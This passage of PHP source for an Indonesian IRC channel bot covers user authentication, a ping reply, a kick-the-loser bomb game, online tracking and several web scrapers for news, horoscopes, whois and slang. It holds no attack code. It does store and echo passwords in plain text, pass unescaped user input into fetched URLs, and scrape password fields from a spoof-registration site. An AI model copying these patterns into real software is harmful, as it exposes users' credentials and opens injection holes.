                } else { $this->msg($sock,$nick,'Wrong Command! Type: .Deluser <nick>'); }
            }
	}
    }
    function chgpass_user($sock,$nick,$oldpass,$newpass){
        global $auth;
        $anick=$nick;
        $nick = strtolower($nick);
        if ($auth["$nick"]["auth"]==2) {
	    if ($oldpass===$auth["$nick"]["pass"]) {
		$auth["$nick"]["pass"] = $newpass;
                $this->notice($sock,$nick,'Password set to: 4'.$auth["$nick"]["pass"].'4');
            } else {$this->msg($sock,$nick,'PASSWORD 4!FaILED!');}
	}
    }
    function level_user($nick){
        global $auth;
        $nick=strtolower($nick);
        if ($auth["$nick"]["status"]=="user"){$stauth=1;}
	elseif ($auth["$nick"]["status"]=="master"){$stauth=2;}
	elseif (strtolower($auth["$nick"]["status"])=="admin"){$stauth=3;}
        elseif (strtolower($auth["$nick"]["status"])=="owner"){$stauth=4;}
        else{$stauth=0;};
        return $stauth;
    }
    function is_userbot($nick){
        global $auth;
        $isuser=0;$nick=strtolower($nick);
        if ($auth["$nick"]) {if ($auth["$nick"]["pass"]) {$isuser=1;}}
        return $isuser;
    }
    function is_loginbot($nick,$ident,$host){
        global $auth;
        $islogin=0;$nick=strtolower($nick);
        if($this->is_userbot($nick)==1){
            if($auth["$nick"]["auth"]==2){
                if($auth["$nick"]["ident"]==$ident){
                    if($auth["$nick"]["host"]==$host){
                        $timelog=time()- $auth["$nick"]["time"];
                        if($timelog<=3600){ $auth["$nick"]["time"]=time();$islogin=1;}else{$auth["$nick"]["auth"]=1;}
                    }else{$auth["$nick"]["auth"]=1;}
                }else{$auth["$nick"]["auth"]=1;}
            }else{$auth["$nick"]["auth"]=1;}
        }
        return $islogin;
    }
    function loginbot($nick,$ident,$host,$pass){
        global $auth;
        $sukseslog=0;$nick=strtolower($nick);
        if($this->is_userbot($nick)==1){
            if($pass===$auth["$nick"]["pass"]){
                $auth["$nick"]["auth"]=2;$auth["$nick"]["time"]=time();$sukseslog=1;
            }
        }
        return $sukseslog;
    }
    function logoutbot($nick){
        global $auth;
        $sukseslog=0;$nick=strtolower($nick);
        if($this->is_userbot($nick)==1){
                $auth["$nick"]["auth"]=1;$auth["$nick"]["time"]=time();$sukseslog=1;
        }
        return $sukseslog;
    }
    ###############################
    
    function stuf_ping($sock,$chan,$nick){
        global $ping;
        $sendping=time();$ping["$sendping"]["ping"] = time();
	$ping["$sendping"]["chan"] = $chan;$ping["$sendping"]["nick"] = strtolower($nick);
	$this->msg($sock,$nick,'PING '.$ping["$sendping"]["ping"].'');
    }
    function stuf_lag($sock,$nick,$dataping){
        global $ping;
        $dataping=str_replace(chr(1),"",$dataping);$dataping=str_replace("\r","",$dataping);
        $dataping=str_replace("\n","",$dataping);$dataping=str_replace("","",$dataping);
        if ($ping["$dataping"]["ping"]==$dataping && $ping["$dataping"]["nick"]==strtolower($nick)){
            $pong = time();$pptime = $pong - $dataping;$meni = "";
            $wakptime=$pptime;
            if ($pptime>=60) {
                $bag = $pptime / 60;$meni = floor($bag)."mins ";$sis = $pptime - ($meni*60);$pptime = $sis;
            }
            $deti = $pptime."secs";$pptime = "$meni$deti";
            $mswktny=array("0","1","2","3","4","5","6","7","8","9");
            $ttlny =array("32","42","46","48","56","62");
            $wktny1 = $mswktny[rand(0,count($mswktny) - 1)];
            $wktny2 = $mswktny[rand(0,count($mswktny) - 1)];
            $wktny3 = $mswktny[rand(0,count($mswktny) - 1)];
            $ttlar= $ttlny[rand(0,count($ttlny) - 1)];
            $mswktny = ( $wktny1.$wktny2.$wktny3 );
            $wktuping = ( $wakptime.'.'.$mswktny );
            if ($wakptime<=5){$stping="9Cepet gitu lho 12";
            }elseif($wakptime>=5){$stping="12Lumayan 9";
            }elseif($wakptime>=10){$stping="11Lemot banget se 9";
            }elseif($wakptime>=15){$stping="4Macet yo 13";
            }elseif($wakptime>=20){$stping="13Gantio server awakmu lemot 4";
            }elseif($wakptime>=25){$stping="Beh bantingen wes Awakmu macet pol 13";
            }
            $this->msg($sock,$ping["$dataping"]["chan"],'Reply from 12[8'.$nick.'12]: bytes=32 12[8time='.$wktuping.'12]ms TTL='.$ttlar);
            $this->notice($sock,$nick,$stping.$nick);
            unset($ping["$dataping"]["nick"]);unset($ping["$dataping"]["ping"]);unset($ping["$dataping"]["chan"]);
        }
    }
    #############################
    function stuf_potong($sock,$nickna,$chan,$pilwar){
        global $warnabenar,$bw,$targetboom,$goboom,$onboom,$chanboom;
        $pilihanwar=strtolower($pilwar);$warnabenar=strtolower($warnabenar);
        if(strtolower($nickna)==strtolower($targetboom) && strtolower($chanboom)==strtolower($chan)){
            if($pilihanwar==strtolower($bw[0]) || $pilihanwar==strtolower($bw[1]) || $pilihanwar=="biru" ){
                if($warnabenar==$pilihanwar){
                    $this->msg($sock,$chan,'Selamat '.$nickna.', kamu berhasil menjinakan Bom!!');
                    $this->mode($sock,'+vvv',$chan,$nickna);
		}
		else{
                  //  $this->kickserv($sock,$chan,$nickna,'0,4BOOOOOOMMMM!!!!! Modyar g koen....!!!');
                    $this->kick($sock,$chan,$nickna,'0,4BOOOOOOMMMM!!!!! Modyar g koen....!!!');
		}
                $goboom=0;$onboom="off";$targetboom="";$chanboom="";
           }
        }
    }
    function stuf_bom($sock,$chan,$targetbm){
        global $chanboom,$bot,$onboom,$warnaboom,$targetboom,$bw,$goboom,$tmpwbom,$tmboom,$warnabenar,$timeboom;
        if(strpos(strtolower($this->show_nickchan($chan)),' '.strtolower($targetbm).' ') && $onboom=="off" && $targetbm!=strtolower($bot['nick'])){
            $onboom="on";$goboom=0;$targetboom=$targetbm;$chanboom=$chan;
            $tmpwbom=$warnaboom;$wrnb=explode(";",$tmpwbom);
            $bw[0]=$wrnb[rand(0,count($wrnb) - 1)];unset($wrnb);
            $tmpwbom=str_replace($bw[0],"",$tmpwbom);$tmpwbom=str_replace(";;",";",$tmpwbom);
            $wrnb=explode(";",$tmpwbom);
            $bw[1]=$wrnb[rand(0,count($wrnb) - 1)];
            unset($wrnb);
            $tmboom=time();$warnabenar=$bw[rand(0,count($bw) - 1)];
            $this->act($sock,$chan,'memasukan BOM ke dalam baju '.$targetbm .' '.$warnabenar);
            $this->msg($sock,$chan,$targetbm.'!! km punya waktu ['.$timeboom.'] detik. Jinakkan Bom dengan memotong kabel yg benar. Dan hanya ada tiga kabel. '.$bw[0] .', '.$bw[1].' dan Biru');
       }
    }
    #############################
    function stuf_ison($sock,$msg){
        global $listison,$chanson,$ada2,$ada1;
        $listson=strtolower($msg);$xpgetison=explode(" ",$listson);
	$i=0;$jmlolol=0;
	foreach ($xpgetison as $pgetlist){if($pgetlist){$i++;$sonson[$i]=$pgetlist;$jmlolol=$i;}}
	$i=0;
	foreach ($listison as $pgetlist){if ($pgetlist){$i++;$lsonson[$i]=$pgetlist;$jmlson=$i;}}
	$dafonline="";$dafoffline="";
	for ($i = 1; $i <= $jmlson; $i++) {
            $satup=$lsonson[$i];$ds=0;
            for ($p = 1; $p <= $jmlolol; $p++) {if ($satup==$sonson[$p]){$ds=1;}}
            if ($ds==1){if(!$ada1["$satup"]){$dafonline .=$satup.' ';$ada1["$satup"]=true;$ada2["$satup"]=false;}}
            else{if(!$ada2["$satup"]){$dafoffline .=$satup.' ';$ada2["$satup"]=true;$ada1["$satup"]=false;}}
	}
	$dafonline=ltrim($dafonline);$dafonline=rtrim($dafonline);$dafoffline=ltrim($dafoffline);$dafoffline=rtrim($dafoffline);
	if ($dafonline){fputs($sock, 'PRIVMSG '. $chanson .' :15(04Ison15) On IRC : '.$dafonline . CRLF);}
	if ($dafoffline){fputs($sock, 'PRIVMSG '. $chanson .' :15(04Ison15) Left IRC : '.$dafoffline . CRLF);}
	unset($lsonson);unset($sonson);
    }
    function add_ison($str){
        global $listison;
        $str=strtolower($str);
        if(in_array($str,$listison)){return 0;}
        else{array_push($listison,$str);return 1;}
        
    }
    function show_ison(){
        global $listison;
        $str_ison="";
        foreach ($listison as $lstr){$str_ison.=$lstr . ' ';}
        $str_ison=str_replace("  "," ",$str_ison);$str_ison=ltrim($str_ison);$str_ison=rtrim($str_ison);
        return $str_ison;
    }
    function del_ison($str){
        global $listison;
        $str_ison="";$str=strtolower($str);
        if(in_array($str,$listison)){
            foreach ($listison as $lstr){
                if(strtolower($str)!=strtolower($lstr)){
                    $str_ison.=$lstr . ';';
                }
            }
            $str_ison=str_replace(";;",";",$str_ison);$str_ison=ltrim($str_ison,";");$str_ison=rtrim($str_ison,";");
            $listison=explode(";",strtolower($str_ison));
            return 1;
        }
        else{return 0;}
    }
    ###############################
    function auto_cy($sock){
        global $systembot,$user_chan_arr;
        $this->send($sock,"PING :88888654476");
        foreach ($user_chan_arr as $cur_xchan) {
            if($systembot['AUTOCYCLE'][strtoupper($cur_xchan["chan"])]=="3ON"){
                $this->part($sock,$cur_xchan["chan"],$this->rnd_cycle());sleep (2);$this->join($sock,$cur_xchan["chan"]);sleep(3);
            }
	}
        return "";
    }
    
    ##############################
    function mod_lookfs($sock,$msg){
        $this->send($sock,"PING :0000927651");
        $fslist=$msg;
        $whoisiplist = "http://www.friendster.com/search/user?country=ID&query=$fslist";
        $lihatiplist = fopen ($whoisiplist, "rb");
        $spasipol = "";
        $katacari=strtolower("View Profile");
        do {
             $barislistip = fread($lihatiplist, 512);
             if(strlen($barislistip) == 0){ break; }
             $spasipol .= $barislistip;
        } while(true);
        fclose ($lihatiplist);
        $spasipol= strtolower($spasipol);
        $spasipol= str_replace("  "," ",$spasipol);
        $spasipol= str_replace("\n"," ",$spasipol);
        $spasipol= str_replace(chr(9)," ",$spasipol);
        $spasipol= str_replace("\r"," ",$spasipol);
        $spasipol= str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$spasipol);
        for ($i = 1; $i <= 10; $i++) {$spasipol = str_replace("  "," ",$spasipol);}
        $spasipol = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$spasipol);
        $ipnya=$spasipol;      
        $lenspasipol=strlen($ipnya);
        if(ereg("search returned zero", $ipnya)){
            $ipnya="Duh Mbuh gak ngerti aQ";
        }
        else{
        $ltextip=0;
        $leftipnya=0;
        $adaip=0;
        do{
           $ltextip=$ltextip+1;
           $iphasil=substr($ipnya,$ltextip,$lenspasipol);
           $iphasil=substr($iphasil,0,strlen($katacari));
           $iphasil=strtolower($iphasil);
           if($iphasil==$katacari){$leftipnya=$ltextip;$adaip=1;break;}
           if($ltextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,$leftipnya+strlen($katacari),$lenspasipol);


        $katacari=strtolower("href=");
        $ltextip=0;
        $leftipnya=0;
        $adaip=0;
        do{
           $ltextip=$ltextip+1;
           $iphasil=substr($ipnya,$ltextip,$lenspasipol);
           $iphasil=substr($iphasil,0,strlen($katacari));
           $iphasil=strtolower($iphasil);
           if($iphasil==$katacari){$leftipnya=$ltextip;$adaip=1;break;}
           if($ltextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,$leftipnya+strlen($katacari),$lenspasipol);
        $katacari=strtolower("<div class=");
        $lenspasipol=strlen($ipnya);
        $rtextip=0;
        $rightipnya=0;
        do{
           $rtextip=$rtextip+1;
           $iphasil=substr($ipnya,$rtextip,$lenspasipol);
           $iphasil=substr($iphasil,0,strlen($katacari));
           $iphasil=strtolower($iphasil);
           if($iphasil==$katacari){$rightipnya=$rtextip;$adaip=1;break;}
           if($rtextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,0,$rightipnya);
        $ipnya= str_replace("</a>"," ",$ipnya);
        $ipnya= str_replace("<span class","",$ipnya);
        $ipnya= str_replace("entitytype","",$ipnya);
        $ipnya= str_replace("(musician)","",$ipnya);
        $ipnya= str_replace("</span>","",$ipnya);
        $ipnya= str_replace("</div>"," ",$ipnya);
        $ipnya= str_replace("<br>"," ",$ipnya);
        $ipnya= str_replace(">"," ",$ipnya);
        }     
        return $ipnya;      
    }
    function mod_astro($astro){
        global $zodiak;
        $astro = strtolower($astro);
        $this->send($sock,"PING :1097658652");
        if (in_array($astro, $zodiak)) {
            $pages = "http://www.astaga.com/astrologi/?cat=$astro";
            $handi = fopen ($pages, "rb");
            $konten = "";
            do {
               $baris = fread($handi, 512);
               if (strlen($baris) == 0) { break; }
               $konten .= $baris;
            } while(true);
            fclose ($handi);
            $this->send($sock,"PING :1097658651");
            $zod1 = stristr($konten,'<td id=ast><p>');
            $zod2 = stristr($zod1,'</table>');
            $bintang = str_replace($zod2,"",$zod1);
            $bintang = str_replace("\n","",$bintang);
            $bintang = str_replace("<td id=ast><p>","".ucfirst(strtolower($astro))." ",$bintang);
            $bintang = str_replace("</p>"," ",$bintang);
            $bintang = str_replace("<p><b>","",$bintang);
            $bintang = str_replace("</b>","",$bintang);
            $bintang = str_replace("</td>","",$bintang);
            $bintang = str_replace("<b>","",$bintang);
            $bintang = str_replace("</td>","",$bintang);
            $bintang = str_replace("</tr>","",$bintang);
            $bintang = str_replace("<tr>","",$bintang);
            $zod3 = stristr($bintang,'<td colspan=2 id=ast bgcolor="#e0e0e0">');
            $bintang = str_replace($zod3,"",$bintang);
            return $bintang;
        }
        else{
            return "Maaf nama bintang yg km masukan tdk ada";
        }

    }
    function mod_lookberita($sock){
        $this->send($sock,"PING :0000927651");
        $tanggalsekarang=date("j/m/Y");
        $whoisiplist = "http://berita.liputan6.com";
        $lihatiplist = fopen ($whoisiplist, "rb");
        $spasipol = "";
        do {
             $barislistip = fread($lihatiplist, 512);
             if(strlen($barislistip) == 0){ break; }
             $spasipol .= $barislistip;
        } while(true);
        fclose ($lihatiplist);
        $spasipol= strtolower($spasipol);
        $spasipol= str_replace("  "," ",$spasipol);
        $spasipol= str_replace("\n","",$spasipol);
        $spasipol= str_replace(chr(9),"",$spasipol);
        $spasipol= str_replace("\r","",$spasipol);
        $spasipol= str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$spasipol);
        for ($i = 1; $i <= 10; $i++) {$spasipol = str_replace("  "," ",$spasipol);}
        $spasipol = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$spasipol);
        $ipnya=$spasipol;      
        $lenspasipol=strlen($ipnya);
        if(ereg("no entries found", $ipnya)){
            $ipnya="Duh Mbuh gak ngerti aQ";
        }
        else{
        $ltextip=0;
        $leftipnya=0;
        $adaip=0;
        do{
           $ltextip=$ltextip+1;
           $iphasil=substr($ipnya,$ltextip,$lenspasipol);
           $iphasil=substr($iphasil,0,strlen($tanggalsekarang));
           $iphasil=strtoupper($iphasil);
           if($iphasil==$tanggalsekarang){$leftipnya=$ltextip+18;$adaip=1;break;}
           if($ltextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,$leftipnya,$lenspasipol);
        $lenspasipol=strlen($ipnya);
        $rtextip=0;
        $rightipnya=0;
        do{
           $rtextip=$rtextip+1;
           $iphasil=substr($ipnya,$rtextip,$lenspasipol);
           $iphasil=substr($iphasil,0,6);
           $iphasil=strtolower($iphasil);
           if($iphasil=="</div>"){$rightipnya=$rtextip;$adaip=1;break;}
           if($rtextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,0,$rightipnya);
        }
        $ipnya=str_replace("</h6>"," 4",$ipnya);
        $ipnya=str_replace("</span>"," 4",$ipnya);
        $ipnya=str_replace("<a href="," ",$ipnya);
        $ipnya=str_replace(">","",$ipnya);
        $ipnya=str_replace("</a>"," ",$ipnya);
        $ipnya=str_replace("</li>"," ",$ipnya);
        $ipnya=str_replace("<span","",$ipnya);
        $ipnya=str_replace("<span","",$ipnya);
        $ipnya=str_replace("<span","",$ipnya);
        $ipnya=str_replace("class=","",$ipnya);
        $ipnya=str_replace("time","",$ipnya);

        if(strlen($ipnya) >= 225 ){$ipnya=substr($ipnya,0,225);}
        global $systembot,$user_chan_arr;
        foreach ($user_chan_arr as $cur_xchan) {
            if($systembot['BERITA'][strtoupper($cur_xchan["chan"])]=="3ON"){
                $this->msg($sock,$cur_xchan["chan"],'12[8info12] 12'.$ipnya);sleep (2);
            }
	}
        $ipnya="";
        return $ipnya;
    }
    function mod_lookberitaperson($sock){
        $this->send($sock,"PING :0000927651");
        $tanggalsekarang=date("j/m/Y");
        $whoisiplist = "http://berita.liputan6.com";
        $lihatiplist = fopen ($whoisiplist, "rb");
        $spasipol = "";
        do {
             $barislistip = fread($lihatiplist, 512);
             if(strlen($barislistip) == 0){ break; }
             $spasipol .= $barislistip;
        } while(true);
        fclose ($lihatiplist);
        $spasipol= strtolower($spasipol);
        $spasipol= str_replace("  "," ",$spasipol);
        $spasipol= str_replace("\n","",$spasipol);
        $spasipol= str_replace(chr(9),"",$spasipol);
        $spasipol= str_replace("\r","",$spasipol);
        $spasipol= str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$spasipol);
        for ($i = 1; $i <= 10; $i++) {$spasipol = str_replace("  "," ",$spasipol);}
        $spasipol = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$spasipol);
        $ipnya=$spasipol;      
        $lenspasipol=strlen($ipnya);
        if(ereg("no entries found", $ipnya)){
            $ipnya="Duh Mbuh gak ngerti aQ";
        }
        else{
        $ltextip=0;
        $leftipnya=0;
        $adaip=0;
        do{
           $ltextip=$ltextip+1;
           $iphasil=substr($ipnya,$ltextip,$lenspasipol);
           $iphasil=substr($iphasil,0,strlen($tanggalsekarang));
           $iphasil=strtoupper($iphasil);
           if($iphasil==$tanggalsekarang){$leftipnya=$ltextip+18;$adaip=1;break;}
           if($ltextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,$leftipnya,$lenspasipol);
        $lenspasipol=strlen($ipnya);
        $rtextip=0;
        $rightipnya=0;
        do{
           $rtextip=$rtextip+1;
           $iphasil=substr($ipnya,$rtextip,$lenspasipol);
           $iphasil=substr($iphasil,0,6);
           $iphasil=strtolower($iphasil);
           if($iphasil=="</div>"){$rightipnya=$rtextip;$adaip=1;break;}
           if($rtextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,0,$rightipnya);
        }
        $ipnya=str_replace("</h6>"," 4",$ipnya);
        $ipnya=str_replace("</span>"," 4",$ipnya);
        $ipnya=str_replace("<a href="," ",$ipnya);
        $ipnya=str_replace(">","",$ipnya);
        $ipnya=str_replace("</a>"," ",$ipnya);
        $ipnya=str_replace("</li>"," ",$ipnya);
        $ipnya=str_replace("<span","",$ipnya);
        $ipnya=str_replace("<span","",$ipnya);
        $ipnya=str_replace("<span","",$ipnya);
        $ipnya=str_replace("class=","",$ipnya);
        $ipnya=str_replace("time","",$ipnya);

        if(strlen($ipnya) >= 225 ){$ipnya=substr($ipnya,0,225);}
        return $ipnya;
    }
    function mod_kirimsms($sock,$nomorsms,$msg){
        $this->send($sock,"PING :0000927651");
        $nomorsmske=$nomorsms;$pesansms=$msg;
        $websmsgratisnya = "";
        $lihatiplist = fopen ($websmsgratisnya, "rb");
        $spasipol = "";
        do {
             $barislistip = fread($lihatiplist, 512);
             if(strlen($barislistip) == 0){ break; }
             $spasipol .= $barislistip;
        } while(true);
        fclose ($lihatiplist);
        $spasipol= strtolower($spasipol);
        $spasipol= str_replace("  "," ",$spasipol);
        $spasipol= str_replace("\n","",$spasipol);
        $spasipol= str_replace(chr(9),"",$spasipol);
        $spasipol= str_replace("\r","",$spasipol);
        $spasipol= str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$spasipol);
        for ($i = 1; $i <= 10; $i++) {$spasipol = str_replace("  "," ",$spasipol);}
        $spasipol = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$spasipol);
        $ipnya=$spasipol;      
        $lenspasipol=strlen($ipnya);
        if(ereg("no entries found", $ipnya)){
            $ipnya="Gagal";
        }else{$ipnya="Terkirim ke ".$nomorsmske;}

        return $ipnya;
    }
    function mod_lookip($sock,$msg){
        $this->send($sock,"PING :0000927651");
        $iplist=$msg;
        $whoisiplist = "http://wq.apnic.net/apnic-bin/whois.pl?searchtext=$iplist";
        $lihatiplist = fopen ($whoisiplist, "rb");
        $spasipol = "";
        do {
             $barislistip = fread($lihatiplist, 512);
             if(strlen($barislistip) == 0){ break; }
             $spasipol .= $barislistip;
        } while(true);
        fclose ($lihatiplist);
        $spasipol= strtolower($spasipol);
        $spasipol= str_replace("  "," ",$spasipol);
        $spasipol= str_replace("\n","",$spasipol);
        $spasipol= str_replace(chr(9),"",$spasipol);
        $spasipol= str_replace("\r","",$spasipol);
        $spasipol= str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$spasipol);
        for ($i = 1; $i <= 10; $i++) {$spasipol = str_replace("  "," ",$spasipol);}
        $spasipol = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$spasipol);
        $ipnya=$spasipol;      
        $lenspasipol=strlen($ipnya);
        if(ereg("no entries found", $ipnya)){
            $ipnya="Duh Mbuh gak ngerti aQ";
        }
        else{
        $ltextip=0;
        $leftipnya=0;
        $adaip=0;
        do{
           $ltextip=$ltextip+1;
           $iphasil=substr($ipnya,$ltextip,$lenspasipol);
           $iphasil=substr($iphasil,0,7);
           $iphasil=strtolower($iphasil);
           if($iphasil=="netname"){$leftipnya=$ltextip;$adaip=1;break;}
           if($ltextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,$leftipnya,$lenspasipol);
        $lenspasipol=strlen($ipnya);
        $rtextip=0;
        $rightipnya=0;
        do{
           $rtextip=$rtextip+1;
           $iphasil=substr($ipnya,$rtextip,$lenspasipol);
           $iphasil=substr($iphasil,0,7);
           $iphasil=strtolower($iphasil);
           if($iphasil=="admin-c"){$rightipnya=$rtextip;$adaip=1;break;}
           if($rtextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,0,$rightipnya);
        }
        $ipnya=str_replace("  ","",$ipnya);
        $ipnya=str_replace("--"," ",$ipnya);
        $ipnya=str_replace("__","",$ipnya);
        $ipnya=str_replace("**","",$ipnya);
        $ipnya=str_replace("--"," ",$ipnya);
        $ipnya=str_replace("remarks:","",$ipnya);
        $ipnya=str_replace("descr:","",$ipnya);
        $ipnya=str_replace("country:"," negara:",$ipnya);
        $ipnya=str_replace("<a href=","",$ipnya);
        $ipnya=str_replace("</a>","",$ipnya);
        $ipnya=str_replace(">","",$ipnya);
        $ipnya=str_replace("important:","",$ipnya);

        return $ipnya;
        
    }
    function mod_uspoof($sock,$msg){
        global $isisp,$jmlspoof;
        $this->send($sock,"PING :0000927651");
        $spoof=strtolower($msg);
	$spallnet = "http://www.allnetwork.or.id/Pendaftaran/Personal_spoof/?mode=view&server=$spoof";
	///$spallnet="http://localhost/spoof1.html";
	$handisp = fopen ($spallnet, "rb");
	$kontensp = "";
        do {
		$barissp = fread($handisp, 512);
		if (strlen($barissp) == 0) { break; }
		$kontensp .= $barissp;
	} while(true);
	fclose ($handisp);
	$kontensp=strtolower($kontensp);
	$kontensp = str_replace("  "," ",$kontensp);
	$kontensp = str_replace("\n","",$kontensp);
	$kontensp = str_replace(chr(9),"",$kontensp);
	$kontensp = str_replace("\r","",$kontensp);
	$kontensp = str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$kontensp);
	for ($i = 1; $i <= 10; $i++) {$kontensp = str_replace("  "," ",$kontensp);}
	$kontensp = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$kontensp);
	$tmpjml1=stristr($kontensp,"<tr bgcolor=yellow><td colspan=10 align=right>found ");
	$tmpjml2=stristr($kontensp," data</td></tr>");
								
	$tmpjml=str_replace($tmpjml2,"",$tmpjml1);
	$tmpjml=str_replace("<tr bgcolor=yellow><td colspan=10 align=right>found ","",$tmpjml);
	$kontensp = str_replace("</td> <td>","</td><td>",$kontensp);
	$kontensp = str_replace("<tr bgcolor=white> <td align=right>","<tr bgcolor=white><td align=right>",$kontensp);
	$kontensp = str_replace("</tr> <tr","</tr><tr",$kontensp);
	$kontensp =  str_replace(" </td>","</td>",$kontensp);
	$kontensp =str_replace("> <td","><td",$kontensp);
        
        for ($i = 1; $i <= $tmpjml; $i++) {
		if ($i==$tmpjml){
                        $identsp="";$spoofsp="";$passsp="";
			$tmpdata1=stristr($kontensp,"<td align=right>".$i."</td>");
			$tmpdata1=substr($tmpdata1,0,strpos($tmpdata1,"<tr bgcolor=#1b6cf7>"));
			$tmpdata1=str_replace("<td align=right>".$i."</td><td>".$spoof."</td><td>","",$tmpdata1);
			$identsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($identsp."</td><td>","",$tmpdata1);
			$spoofsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($spoofsp."</td><td>","",$tmpdata1);
			$passsp=substr($tmpdata1,0,strpos($tmpdata1,"</td></tr>"));
			$isisp[$i]["$spoof"]['ident']=$identsp;
			$isisp[$i]["$spoof"]['spoof']=$spoofsp;
			$isisp[$i]["$spoof"]['pass']=$passsp;
		}
		else{
			$identsp="";$spoofsp="";$passsp="";
			$tmpdata1=stristr($kontensp,"<td align=right>".$i."</td>");
			$tmpdata1=substr($tmpdata1,0,strpos($tmpdata1,"<tr bgcolor=white>"));
			$tmpdata1=str_replace("<td align=right>".$i."</td><td>".$spoof."</td><td>","",$tmpdata1);
			$identsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($identsp."</td><td>","",$tmpdata1);
			$spoofsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($spoofsp."</td><td>","",$tmpdata1);
			$passsp=substr($tmpdata1,0,strpos($tmpdata1,"</td></tr>"));
								
			$isisp[$i]["$spoof"]['ident']=$identsp;
			$isisp[$i]["$spoof"]['spoof']=$spoofsp;
			$isisp[$i]["$spoof"]['pass']=$passsp;
		}
                
	}
        $jmlspoof["$spoof"]=$tmpjml;
        return $jmlspoof["$spoof"];
    }
    function mod_uslang($sock,$msg){
        global $kmusedan,$kmjml;
        //$urledan="http://localhost/aa.html";
        $urledan="http://www.malesbanget.com/kamus/definisi.php?kata=".$msg;
        $btsstr='<td class='.chr(34).'BOX'.chr(34).'><span class='.chr(34).'KAMUS'.chr(34).'><span class='.chr(34).'kecil'.chr(34).'>';
        $btsstrtab1='<table width='.chr(34).'100%'.chr(34).' border='.chr(34).'0'.chr(34).' cellpadding='.chr(34).'0'.chr(34).' cellspacing='.chr(34).'0'.chr(34).'>';
        $btsstrtab2='</table>';
        $strsplit='<h2 align='.chr(34).'left'.chr(34).'>';
        $kedan = fopen ($urledan, "rb");
        $cotedan = "";
        do {
                $bcotedan = fread($kedan, 1024);
                if (strlen($bcotedan) == 0) { break; }
                $cotedan .= $bcotedan;
        } while(true);
        fclose ($kedan);
        if(strpos($cotedan,$btsstr)){
            $cotedan=substr($cotedan,strpos($cotedan,$btsstr) + strlen($btsstr));
            $cotedan=substr($cotedan,0,strpos($cotedan,$btsstr));
            $cotedan=substr($cotedan,0,strpos($cotedan,'<p><span class='.chr(34).'signature'.chr(34).'>'));
            $intedan=substr_count($cotedan,"  ");
            for ($i = 1; $i <= $intedan; $i++) {$cotedan=str_replace("  "," ",$cotedan);}
            $intedan=substr_count($cotedan,$btsstrtab1);
            for ($i = 1; $i <= $intedan; $i++) {
            $tmpctedan='';
            $tmpctedan=substr($cotedan,strpos($cotedan,$btsstrtab1));
            $tmpctedan=substr($tmpctedan,0,strpos($tmpctedan,$btsstrtab2) + strlen($btsstrtab2));
            $cotedan=str_replace($tmpctedan,"",$cotedan);
            }
            if(strpos($cotedan,'</span></span></td>')){$cotedan=substr($cotedan,0,strpos($cotedan,'</span></span></td>'));}
            $cotedan=ltrim($cotedan);$cotedan=rtrim($cotedan);
            if(substr($cotedan,0,strlen($strsplit))==$strsplit){$cotedan=substr($cotedan,strlen($strsplit));}
            $cotedan=str_replace('</h2>','',$cotedan);
            $arredan=explode($strsplit,$cotedan);
            for ($i = 0; $i < count($arredan); $i++) {
                    $arredan[$i]=str_replace("\n","",$arredan[$i]);$arredan[$i]=str_replace("\r","",$arredan[$i]);
                    $arredan[$i]=str_replace('<br><br>','<br>',$arredan[$i]);
                    $arredan[$i]=substr($arredan[$i],strpos($arredan[$i],'</span>')+7);$arredan[$i]='<span>'.ltrim($arredan[$i]);
                    $batas=strpos($arredan[$i],"<span>")+6;$tmpbts=substr($arredan[$i],$batas);
                    $batas=strpos($tmpbts,"</span>");$tmpbts=substr($tmpbts,0,$batas);$kmusedan[$i]["kata"]=$tmpbts;
                    $batas=strpos($arredan[$i],'class='.chr(34).'definisi'.chr(34).'>')+17;$tmpbts=substr($arredan[$i],$batas);
                    $batas=strpos($tmpbts,"</p><p");$tmpbts=substr($tmpbts,0,$batas);
                    $tmpbts = str_replace("<b>","",$tmpbts);$tmpbts = str_replace("</b>","",$tmpbts);$tmpbts = str_replace("<i>","",$tmpbts);
                    $tmpbts = str_replace("</i>","",$tmpbts);$kmusedan[$i]["definisi"][strtolower($msg)]=$tmpbts;
                    $batas=strpos($arredan[$i],'class='.chr(34).'definisi_contoh'.chr(34).'>')+24;$tmpbts=substr($arredan[$i],$batas);
                    $batas=strpos($tmpbts,"</span></p>");$tmpbts=substr($tmpbts,0,$batas);
                    $tmpbts=str_replace("<em>","",$tmpbts);$tmpbts=str_replace("</em>","",$tmpbts);
